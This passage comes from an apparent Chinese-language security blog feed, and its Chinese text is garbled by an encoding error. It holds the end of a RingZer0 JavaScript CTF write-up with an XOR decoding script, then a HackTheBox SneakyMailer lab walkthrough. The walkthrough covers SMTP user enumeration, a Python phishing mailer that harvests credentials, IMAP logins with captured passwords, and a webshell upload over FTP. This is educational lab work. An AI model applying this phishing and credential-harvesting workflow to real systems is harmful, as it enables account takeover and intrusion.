x16\x14\x21\x1D\x07\x05\x19\x5D\x5D\x47\x52\x60\x46\x4C\x1E\x1D\x5F\x5F\x1C\x15\x7E\x0B\x0B\x00\x49\x51\x5F\x55\x44\x31\x52\x45\x13\x1B\x40\x5C\x46\x10\x7C\x38\x10\x19\x07\x55\x13\x44\x56\x31\x1C\x15\x19\x1B\x56\x13\x47\x58\x30\x1D\x1B\x58\x55\x1D\x57\x5D\x41\x7C\x4D\x4B\x4D\x49\x4F&quot;;function xor(ori_chr, dst_chr){    return String.fromCharCode(ori_chr.charCodeAt() ^ dst_chr.charCodeAt());}function decode(key){    var buffer = &#39;&#39;    for (var i = 0; i &lt; func.length; i++)     {        buffer += xor(key[i % 9], func[i])    }    return buffer;}function guess(i, guesskey){    key = []    for (var j = 0; j &lt; guesskey.length; j++)     {        key[(i+j) % 9] = xor(guesskey[j], func[i + j])    }    return key.join(&#39;&#39;);}for (var i = 0; i &lt; func.length - 9; i++) {    key = guess(i, &#39;document.&#39;);    finalbuffer = decode(key);    if (finalbuffer.indexOf(&#39;document.location&#39;) != -1)    {        console.log(i, key, finalbuffer);    }}</code></pre><p><img src="/2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ‹¿åˆ°ç”¨æˆ·åå¯†ç </p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>ç®€å•å°ç»“ä¸‹ï¼Œjsçš„trickè¿˜æ˜¯æŒºå¤šçš„ï¼Œä¸è¿‡è¿™å‡ é“é¢˜æ¥è§¦åˆ°trickçš„å±‚é¢å¾ˆæµ…ã€‚çœŸæ­£CTFæ¯”èµ›ä¸­è¿ç”¨åˆ°å¼±ç±»å‹ä¹‹ç±»çš„å€’æ˜¯æ¯”è¾ƒæœ‰æ„æ€ã€‚è€Œè¿™äº›challengeæ›´å¤šçš„å°±æ˜¯åˆ©ç”¨jsæ¥æ··æ·†è§†å¬ä¹‹ç±»çš„ï¼Œæ‰€ä»¥è€å®è¯´æ¯”è¾ƒè€ƒéªŒä»£ç å®¡è®¡çš„è€å¿ƒè·Ÿdebugæ°´å¹³ã€‚<br>  è¿™ä¸ªå¹³å°çš„jailç³»åˆ—æœ‰æ—¶é—´ä¼šå»åšåšã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-SneakyMailer</title>
      <link href="2020/07/16/hackthebox-SneakyMailer/"/>
      <url>2020/07/16/hackthebox-SneakyMailer/</url>
      
        <content type="html"><![CDATA[<p>SneakyMaileræ˜¯è‡ªå·±åœ¨htbä¸Šå®Œæˆçš„ç¬¬30å°é¶æœºã€‚å› ä¸ºç‰¹æ®Šçºªå¿µæ„ä¹‰åŠ ä¸Šæ¶‰åŠåˆ°ä¸€äº›å¾ˆæœ‰æ„æ€çš„çŸ¥è¯†æ‰€ä»¥è®°å½•ä¸‹ã€‚æ•´ä½“éš¾åº¦æ¯”è¾ƒç®€å•ã€‚</p><p>ç”±äºSneakyMailerè¿˜æ˜¯activeçŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä¼šç»™æ–‡ç« ä¸Šé”ç›´åˆ°é¶æœºé€€å½¹ã€‚<br>ps:å·²é€€å½¹<br><img src="/2020/07/16/hackthebox-SneakyMailer/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><a id="more"></a><ul><li>é¶æœºipï¼š 10.10.10.197</li><li>æ”»å‡»æœºï¼š 10.10.14.87</li></ul><h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>é¦–å…ˆä¸Šnmap</p><pre><code class="bash"># Nmap 7.80 scan initiated Mon Jul 13 10:04:34 2020 as: nmap -sC -sV -oA nmap/sneakymailer 10.10.10.197Nmap scan report for 10.10.10.197Host is up (0.41s latency).Not shown: 993 closed portsPORT     STATE SERVICE  VERSION21/tcp   open  ftp      vsftpd 3.0.322/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: |   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)25/tcp   open  smtp     Postfix smtpd|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 80/tcp   open  http     nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: Did not follow redirect to http://sneakycorp.htb143/tcp  open  imap     Courier Imapd (released 2018)|_imap-capabilities: ENABLE THREAD=ORDEREDSUBJECT UTF8=ACCEPTA0001 OK QUOTA SORT CHILDREN STARTTLS IMAP4rev1 THREAD=REFERENCES ACL2=UNION NAMESPACE ACL IDLE CAPABILITY completed UIDPLUS| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example.com| Not valid before: 2020-05-14T17:14:21|_Not valid after:  2021-05-14T17:14:21|_ssl-date: TLS randomness does not represent time993/tcp  open  ssl/imap Courier Imapd (released 2018)| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example.com| Not valid before: 2020-05-14T17:14:21|_Not valid after:  2021-05-14T17:14:21|_ssl-date: TLS randomness does not represent time8080/tcp open  http     nginx 1.14.2|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: nginx/1.14.2|_http-title: Welcome to nginx!Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Jul 13 10:05:43 2020 -- 1 IP address (1 host up) scanned in 68.86 seconds</code></pre><p>nmapå¾—åˆ°ç»“æœæœ‰å¤šä¸ªç«¯å£å¼€æ”¾ï¼Œå…¶ä¸­ä¸å¤ªå¸¸è§„çš„æ˜¯25,143,993ç­‰ç«¯å£ã€‚æ­£å¦‚ç»“æœæ‰€ç¤ºï¼Œè¿™äº›ç«¯å£éƒ½ä¸é‚®ä»¶æœ‰å…³ã€‚å…¶ä¸­25æ˜¯smtpç«¯å£ã€‚143,993æ˜¯imapçš„é»˜è®¤ä¸¤ä¸ªç«¯å£ã€‚å…¶ä¸­ä¸€ä¸ªæ˜¯æ˜æ–‡ä¸€ä¸ªæ˜¯sslåŠ å¯†ã€‚</p><p>21ftpç«¯å£ä¸èƒ½åŒ¿åç™»å½•ã€‚é‚£æˆ‘ä»¬å…ˆä»80ç«¯å£å¼€å§‹ã€‚å¼€å§‹ä¸€ä¸ªè·³è½¬ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠ<code>sneakycorp.htb</code>åŠ å…¥åˆ°<code>/etc/hosts</code>ä¸­ã€‚webé¡µé¢ç»“æœåªæœ‰index.phpä¸team.phpå­˜åœ¨ã€‚è€Œteam.phpæºç ä¸­å­˜åœ¨å‡ åä¸ªemail.å‡æ˜¯<code>xxx@sneakymailer.htb</code>å½¢å¼ã€‚<br>æœæ–­å…ˆæŠŠmailæ”¶é›†èµ·æ¥ã€‚å¹¶ä¸”userè·Ÿmailå„å­˜ä¸€ä»½</p><pre><code class="python">import requestsimport reurl=&#39;http://sneakycorp.htb/team.php&#39;r=requests.get(url)mail=re.findall(r&#39;&lt;td&gt;(.*)@sneakymailer.htb&#39;,r.text)f=open(&#39;user.txt&#39;,&#39;w&#39;)for i in mail:    #f.write(i+&#39;\n&#39;)    f.write(i+&#39;@sneakymailer.htb&#39;+&#39;\n&#39;)f.close()</code></pre><p>ç„¶åæºç ä¸­æç¤ºäº†ä¸€ä¸ª<code>pypi/register.php</code>ã€‚è®¿é—®åä¼¼ä¹å¯ä»¥æä¾›æ³¨å†ŒåŠŸèƒ½ã€‚ä½†æ˜¯æ ¹æ®ç®€å•çš„å‡ ä¸ªdemoæ„Ÿè§‰è¿˜æ˜¯ä¸ªé™æ€æ–‡ä»¶ã€‚å› ä¸ºå‡å¦‚å†æ¬¡è¾“å…¥å¯†ç è·ŸåŸå¯†ç ä¸ä¸€è‡´å®ƒä¹Ÿæ²¡æœ‰è¿›è¡Œä»»ä½•æŠ¥é”™ã€‚é‚£ä¹ˆæˆ‘æœ‰ç†ç”±æ€€ç–‘æ•´ä¸ªç½‘ç«™éƒ½é™æ€çš„ã€‚</p><p>æ—¢ç„¶å¦‚æ­¤åªèƒ½ä»å‡ ä¸ªé‚®ä»¶æœåŠ¡å™¨å…¥æ‰‹enumäº†ã€‚è¿™é‡Œæˆ‘å…ˆå»äº†è§£äº†ä¸‹<code>smtp</code>,<code>imap</code>çš„ç›¸å…³ä¿¡æ¯ä»¥åŠå¸¸è§æ¼æ´ã€‚ç®€å•æ¦‚æ‹¬å¦‚ä¸‹ï¼š</p><ul><li>smtpä¸»è¦ç”¨äºå‘é€é‚®ä»¶ã€‚imapä¸»è¦ç”¨äºæ¥æ”¶é‚®ä»¶</li><li>smtp/imap server å‡å¯ä½¿ç”¨ telnet,ncè¿›è¡Œè¿æ¥</li><li>smtpå¯ä»¥åœ¨ä¸ç™»å½•çš„æƒ…å†µä¸‹è¿›è¡Œusernameçš„æšä¸¾ã€‚imapå¿…é¡»ç™»å½•æ‰èƒ½è¿›è¡Œæ¥ä¸‹æ¥çš„æŸ¥çœ‹é‚®ä»¶ä¿¡æ¯ç­‰æ“ä½œ</li></ul><p>å¹¶ä¸”ä¸¤ç§æœåŠ¡åŸºæœ¬ä¸Šä¸å­˜åœ¨å¯ä»¥ç›´æ¥åˆ©ç”¨çš„æ¼æ´ã€‚çœ‹æ¥æ˜¯è¦è¿›è¡Œä¿¡æ¯æšä¸¾äº†ã€‚<br>é¦–å…ˆä»25ç«¯å£å¼€å§‹ã€‚å‰é¢æåˆ°äº†ã€‚é’ˆå¯¹smtpçš„enumä¸»è¦å°±åªæœ‰ç”¨æˆ·åçš„enum.æˆ‘ä»¬æ— æ³•è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚<br>è¿™ç¯‡<a href="https://www.hackingarticles.in/4-ways-smtp-enumeration/" target="_blank" rel="noopener">æ–‡ç« </a>è®²çš„éå¸¸å…¨é¢ã€‚æˆ‘ä¹ŸåŸºæœ¬ä¸Šå…ˆæŒ‰ç…§è¿™ä¸ªæµç¨‹æ¥ã€‚æ¯”å¦‚é¦–å…ˆè¿›è¡Œæ‰‹åŠ¨æµ‹è¯•<code>VRFY root</code>ã€‚å¾—åˆ°252.è¯´æ˜rootç”¨æˆ·æ˜¯åœ¨æœºå™¨ä¸Šçš„ã€‚ä¸è¿‡ç»è¿‡å‰é¢nmapçš„æ¢æµ‹,ä¼¼ä¹èƒ½ä½¿ç”¨çš„smtpå‘½ä»¤éå¸¸å±€é™ã€‚çœ‹æ¥æˆ‘ä»¬åªèƒ½ä»<code>VRFY</code>ä¸‹æ‰‹äº†ã€‚</p><p>è¿™é‡Œä½¿ç”¨msfçš„æ¨¡å—è¿›è¡Œenum,å…·ä½“æ–¹æ³•å‚è€ƒä¸Šé¢æ–‡ç« ã€‚å…¶å®ä¹‹å‰ä½¿ç”¨äº†smtp-user-enumã€‚ä½†ä¼¼ä¹å­˜åœ¨é—®é¢˜,æ²¡æœ‰å¾—åˆ°æˆ‘æƒ³è¦çš„ç»“æœã€‚æ¢äº†msfçš„æ¨¡å—å°±å¥½äº†ã€‚</p><pre><code class="bash">msf5 auxiliary(scanner/smtp/smtp_enum) &gt; exploit[*] 10.10.10.197:25       - 10.10.10.197:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)[+] 10.10.10.197:25       - 10.10.10.197:25 Users found: airisatou@sneakymailer.htb, angelicaramos@sneakymailer.htb, ashtoncox@sneakymailer.htb, bradleygreer@sneakymailer.htb, brendenwagner@sneakymailer.htb, briellewilliamson@sneakymailer.htb, brunonash@sneakymailer.htb, caesarvance@sneakymailer.htb, carastevens@sneakymailer.htb, cedrickelly@sneakymailer.htb, chardemarshall@sneakymailer.htb, colleenhurst@sneakymailer.htb, dairios@sneakymailer.htb, donnasnider@sneakymailer.htb, doriswilder@sneakymailer.htb, finncamacho@sneakymailer.htb, fionagreen@sneakymailer.htb, garrettwinters@sneakymailer.htb, gavincortez@sneakymailer.htb, gavinjoyce@sneakymailer.htb, glorialittle@sneakymailer.htb, haleykennedy@sneakymailer.htb, hermionebutler@sneakymailer.htb, herrodchandler@sneakymailer.htb, hopefuentes@sneakymailer.htb, howardhatfield@sneakymailer.htb, jacksonbradshaw@sneakymailer.htb, jenagaines@sneakymailer.htb, jenettecaldwell@sneakymailer.htb, jenniferacosta@sneakymailer.htb, jenniferchang@sneakymailer.htb, jonasalexander@sneakymailer.htb, laelgreer@sneakymailer.htb, martenamccray@sneakymailer.htb, michaelsilva@sneakymailer.htb, michellehouse@sneakymailer.htb, olivialiang@sneakymailer.htb, paulbyrd@sneakymailer.htb, prescottbartlett@sneakymailer.htb, quinnflynn@sneakymailer.htb, rhonadavidson@sneakymailer.htb, sakurayamamoto@sneakymailer.htb, sergebaldwin@sneakymailer.htb, shaddecker@sneakymailer.htb, shouitou@sneakymailer.htb, sonyafrost@sneakymailer.htb, sukiburks@sneakymailer.htb, sulcud@sneakymailer.htb, tatyanafitzpatrick@sneakymailer.htb, thorwalton@sneakymailer.htb, tigernixon@sneakymailer.htb, timothymooney@sneakymailer.htb, unitybutler@sneakymailer.htb, vivianharrell@sneakymailer.htb, yuriberry@sneakymailer.htb, zenaidafrank@sneakymailer.htb, zoritaserrano@sneakymailer.htb[*] 10.10.10.197:25       - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><p>çœ‹èµ·æ¥æˆ‘ä»¬å¾—åˆ°çš„é‚®ç®±éƒ½æ˜¯æœ‰æ•ˆçš„â€¦â€¦åˆ°è¿™ä¸€æ­¥å°±å¾ˆéš¾è¿›ä¸€æ­¥è¿›è¡Œå‘å±•äº†ã€‚å› ä¸ºsmtpçš„åˆ©ç”¨æœ€å¤šåˆ°æšä¸¾ç”¨æˆ·åã€‚imapä¸ftpåˆéœ€è¦ç”¨æˆ·å¯†ç ã€‚8080ç«¯å£è·‘ç€ä¸€ä¸ªä¼¼ä¹è£¸çš„nginx.é¡¿æ—¶å°‘äº†æ€è·¯</p><p>å»è®ºå›é€›äº†ä¸€åœˆã€‚å‘ç°å¤§å®¶æåˆ°äº†é’“é±¼çš„è¯´æ³•ã€‚éš¾ä¸æˆæ˜¯è¦å‘é€é‚®ä»¶ï¼Ÿç®€å•æœç´¢äº†ä¸‹å‘ç°pythonæ”¯æŒæˆ‘ä»¬è°ƒç”¨smtpæœåŠ¡å™¨è¿›è¡Œemailçš„å‘é€ã€‚é‚£å°±æŒ‰ç…§èœé¸Ÿæ•™ç¨‹çš„è„šæœ¬æ”¹æ”¹</p><pre><code class="python">#!/usr/bin/python# -*- coding: UTF-8 -*-import smtplibfrom email.mime.text import MIMETextfrom email.header import Headersender = &#39;byc@bycsec.top&#39;with open(&#39;mail.txt&#39;,&#39;r&#39;) as f:    receivers = f.read().splitlines()message = MIMEText(&#39;http://10.10.14.87&#39;, &#39;plain&#39;, &#39;utf-8&#39;)message[&#39;From&#39;] = Header(&quot;byc&quot;, &#39;utf-8&#39;)message[&#39;To&#39;] =  Header(&quot;aaa&quot;, &#39;utf-8&#39;)     subject = &#39;Sth Really Helpful&#39;message[&#39;Subject&#39;] = Header(subject, &#39;utf-8&#39;)try:    smtpObj = smtplib.SMTP(&#39;10.10.10.197&#39;,25)    smtpObj.sendmail(sender, receivers, message.as_string())    print(&quot;[*] success&quot;)except smtplib.SMTPException:    print(&quot;[*] Error&quot;)</code></pre><p>è¿™é‡Œä¸»è¦æ˜¯æ›´æ”¹<code>smtplib.SMTP(&#39;10.10.10.197&#39;,25)</code>ã€‚è¿™æ ·æˆ‘ä»¬å°±èƒ½ä½¿ç”¨htbçš„smtpæœåŠ¡å™¨è¿›è¡Œå‘é€é‚®ä»¶ã€‚åŒæ—¶<code>receivers</code>è¿™ä¸ªå‚æ•°æ˜¯æ”¯æŒpythonåˆ—è¡¨çš„ã€‚æ‰€ä»¥ç›´æ¥ä¼ å…¥æˆ‘ä»¬ä¹‹å‰æ”¶é›†çš„æ‰€æœ‰email.æœ€åå†…å®¹ç›´æ¥ç»™æˆ‘ä»¬è‡ªå·±ip.çœ‹çœ‹ä¼šä¸ä¼šæœ‰ç‚¹å‡»åŠ«æŒçš„ä¿¡æ¯å‘è¿‡æ¥ã€‚</p><p>å‘ç°æœ‰postä¿¡æ¯ã€‚é‚£ä¹ˆå†è·‘éè„šæœ¬,ç›´æ¥åˆ‡æ¢æˆncæ¥æ”¶<br><img src="/2020/07/16/hackthebox-SneakyMailer/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>çœ‹èµ·æ¥paulç”¨æˆ·çš„è´¦å·å¯†ç åˆ°æ‰‹äº†ã€‚ï¼ˆç»å…¸é’“é±¼åœºæ™¯ï¼‰<br>æ¥ä¸‹æ¥å› ä¸ºè¿™æ˜¯é‚®ç®±ç”¨æˆ·ï¼Œæˆ‘ä»¬ç”¨imapè´¦æˆ·æˆåŠŸç™»å½•<br>å…³äºimapçš„<a href="https://www.atmail.com/blog/imap-101-manual-imap-sessions/" target="_blank" rel="noopener">å‘½ä»¤æ‰§è¡Œ </a><br>çœ‹äº†è¿™ç¯‡æ–‡ç« åº”è¯¥å°±ä¼šæ“ä½œäº†ã€‚ç®€å•çš„è¯´å°±æ˜¯åœ¨æ¯ä¸ªå‘½ä»¤å‰éƒ½è¦åŠ ä¸ªå­—æ¯åšå‰ç¼€ã€‚ç„¶åæ‰§è¡Œ<code>LOGIN</code>,<code>SELECT</code>ç­‰æ“ä½œ<br>ç¬¬ä¸€æ­¥å…ˆæŸ¥çœ‹namespaceã€‚ç„¶åå‘ç°æˆ‘ä»¬çš„Personal Namespaceæœ‰<code>INBOX.</code>å­˜åœ¨ã€‚æ‰€ä»¥ç»§ç»­åˆ—  <code>INBOX.</code>ä¸‹çš„æ–‡ä»¶å¤¹ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€‰å®šä¸€ä¸ªæ–‡ä»¶å¤¹äº†</p><pre><code class="bash">root@byc404:~# telnet 10.10.10.197 143Trying 10.10.10.197...Connected to 10.10.10.197.Escape character is &#39;^]&#39;.* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.a login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)a OK LOGIN Ok.n namespace* NAMESPACE ((&quot;INBOX.&quot; &quot;.&quot;)) NIL ((&quot;#shared.&quot; &quot;.&quot;)(&quot;shared.&quot; &quot;.&quot;))n OK NAMESPACE completed.A1 list &quot;INBOX.&quot; &quot;*&quot;* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Trash&quot;* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Sent&quot;* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Deleted Items&quot;* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Sent Items&quot;A1 OK LIST completed</code></pre><p>ç»è¿‡å°è¯•å‘ç°åªæœ‰INBOX.Sent Itemsé‡Œæœ‰<code>2 EXISTS</code>.</p><pre><code class="bash">g21 SELECT &quot;INBOX.Sent Items&quot;* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited* 2 EXISTS* 0 RECENT* OK [UIDVALIDITY 589480766] Ok* OK [MYRIGHTS &quot;acdilrsw&quot;] ACLg21 OK [READ-WRITE] Ok</code></pre><p>é‚£ä¹ˆæˆ‘ä»¬ä¾æ¬¡æŸ¥çœ‹é‚®ä»¶ä¸»é¢˜ä¸å†…å®¹</p><pre><code class="bash">f fetch 1:2 (BODY[HEADER.FIELDS (Subject)])* 1 FETCH (BODY[HEADER.FIELDS (&quot;Subject&quot;)] {27}Subject: Password reset)* 2 FETCH (BODY[HEADER.FIELDS (&quot;Subject&quot;)] {27}Subject: Module testing)f OK FETCH completed.F1 fetch 1 RFC822* 1 FETCH (RFC822 {2167}MIME-Version: 1.0To: root &lt;root@debian&gt;From: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;Subject: Password resetDate: Fri, 15 May 2020 13:03:37 -0500Importance: normalX-Priority: 3Content-Type: multipart/alternative;        boundary=&quot;_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_&quot;--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_Content-Transfer-Encoding: quoted-printableContent-Type: text/plain; charset=&quot;utf-8&quot;Hello administrator, I want to change this password for the developer accou=ntUsername: developerOriginal-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]CPlease notify me when you do it=20--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_Content-Transfer-Encoding: quoted-printableContent-Type: text/html; charset=&quot;utf-8&quot;&lt;html xmlns:o=3D&quot;urn:schemas-microsoft-com:office:office&quot; xmlns:w=3D&quot;urn:sc=hemas-microsoft-com:office:word&quot; xmlns:m=3D&quot;http://schemas.microsoft.com/of=fice/2004/12/omml&quot; xmlns=3D&quot;http://www.w3.org/TR/REC-html40&quot;&gt;&lt;head&gt;&lt;meta ht=tp-equiv=3DContent-Type content=3D&quot;text/html; charset=3Dutf-8&quot;&gt;&lt;meta name==3DGenerator content=3D&quot;Microsoft Word 15 (filtered medium)&quot;&gt;&lt;style&gt;&lt;!--/* Font Definitions */@font-face        {font-family:&quot;Cambria Math&quot;;        panose-1:2 4 5 3 5 4 6 3 2 4;}@font-face        {font-family:Calibri;        panose-1:2 15 5 2 2 2 4 3 2 4;}/* Style Definitions */p.MsoNormal, li.MsoNormal, div.MsoNormal        {margin:0in;        margin-bottom:.0001pt;        font-size:11.0pt;        font-family:&quot;Calibri&quot;,sans-serif;}.MsoChpDefault        {mso-style-type:export-only;}@page WordSection1        {size:8.5in 11.0in;        margin:1.0in 1.0in 1.0in 1.0in;}div.WordSection1        {page:WordSection1;}--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body lang=3DEN-US link=3Dblue vlink=3D&quot;#954F72&quot;&gt;&lt;div cla=ss=3DWordSection1&gt;&lt;p class=3DMsoNormal&gt;Hello administrator, I want to chang=e this password for the developer account&lt;/p&gt;&lt;p class=3DMsoNormal&gt;&lt;o:p&gt;&amp;nbs=p;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Username: developer&lt;/p&gt;&lt;p class=3DMsoNorma=l&gt;Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C&lt;/p&gt;&lt;p class=3DMsoNorm=al&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Please notify me when you do i=t &lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;=--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--)F1 OK FETCH completed.F1 fetch 2 RFC822* 2 FETCH (RFC822 {585}To: low@debianFrom: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;Subject: Module testingMessage-ID: &lt;4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb&gt;Date: Wed, 27 May 2020 13:28:58 -0400User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Thunderbird/68.8.0MIME-Version: 1.0Content-Type: text/plain; charset=utf-8; format=flowedContent-Transfer-Encoding: 7bitContent-Language: en-USHello lowYour current task is to install, test and then erase every python module you find in our PyPI service, let me know if you have any inconvenience.)F1 OK FETCH completed.</code></pre><p>ç¬¬ä¸€ä»½é‚®ä»¶æ³„éœ²äº†ä¸€ä»½ç”¨æˆ·å¯†ç <code>developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</code>.ç¬¬äºŒä¸ªé‚®ä»¶æ³„éœ²äº†ä¸€ä¸ªç”¨æˆ·ã€‚çœ‹èµ·æ¥å¯ä»¥ç»§ç»­è¿›è¡Œè´¦æˆ·å¯†ç çš„å°è¯•äº†ã€‚</p><p>æœä¸å…¶ç„¶è¿˜æ˜¯æ²¡æœ‰å¾—åˆ°sshçš„è´¦æˆ·ã€‚ä½†æ˜¯developerå¯ä»¥ç™»é™†ftpã€‚çœ‹äº†ä¸‹å‘ç°é‡Œé¢æ˜¯ä¸ªdevæ–‡ä»¶å¤¹ã€‚å†…å®¹è·Ÿæˆ‘ä»¬80ç«¯å£çš„ç½‘é¡µä¸€è‡´ã€‚<br>å…ˆæŠŠdevæ–‡ä»¶å¤¹æ‹–ä¸‹æ¥ã€‚</p><pre><code class="bash">wget ftp://10.10.10.197:21/* --ftp-user=developer  --ftp-password=m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C  -r</code></pre><p>ä»”ç»†ä¸€å®¡å‘ç°éƒ½æ˜¯é™æ€æ–‡ä»¶ã€‚è¿™ç‚¹æœ‰ç‚¹æ‡µã€‚ä¸è¿‡æ–‡ä»¶å¤¹åå­—å€’æ˜¯æé†’äº†æˆ‘ä¸€ä¸ªç–å¿½çš„åœ°æ–¹ã€‚é‚£å°±æ˜¯æˆ‘å¿˜è®°æ”¶é›†å­åŸŸåäº†ã€‚äºæ˜¯wfuzzèµ°èµ·æ”¶é›†å­åŸŸåã€‚å‘ç°ç¡®å®å­˜åœ¨<code>dev.sneakycorp.htb</code></p><p>æ—¢ç„¶æˆ‘ä»¬çš„ftpç›®å½•æ˜¯å¯¹åº”çš„webç›®å½•ã€‚é‚£å°±ç›´æ¥<code>mput</code>ä¸Šä¼ webshellå³å¯ã€‚å‘½ä»¤æ‰§è¡Œgetshell.<br><img src="/2020/07/16/hackthebox-SneakyMailer/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å°ç»“ä¸‹ã€‚è¿™ä¸€éƒ¨åˆ†æ€»ä½“ä¸Šåªæœ‰enumçš„å†…å®¹ã€‚ä¸è¿‡æ•´ä½“ä¸Šæ”¶è·æŒºå¤§çš„ã€‚å› ä¸ºä»¥å‰æ²¡æ€ä¹ˆæ¥è§¦è¿‡smtp.ç°åœ¨å€Ÿæ­¤æœºä¼šæ¥è§¦smtp,imapç†Ÿæ‚‰äº†ç›¸å¯¹åº”çš„å‘½ä»¤å€’æ˜¯æŒºä¸é”™çš„ã€‚</p><h2 id="privesc-to-user"><a href="#privesc-to-user" class="headerlink" title="privesc to user"></a>privesc to user</h2><p>  æ¥ä¸‹æ¥æ˜¯ææƒéƒ¨åˆ†ã€‚è¿™é‡Œæˆ‘é‡ç‚¹å…³æ³¨pypiè·Ÿlow.å› ä¸ºè¿™ä¸¤ä¸ªç”¨æˆ·åœ¨å‰é˜¶æ®µå‡ºç°çš„é¢‘ç‡æ¯”è¾ƒé«˜ã€‚</p><p>  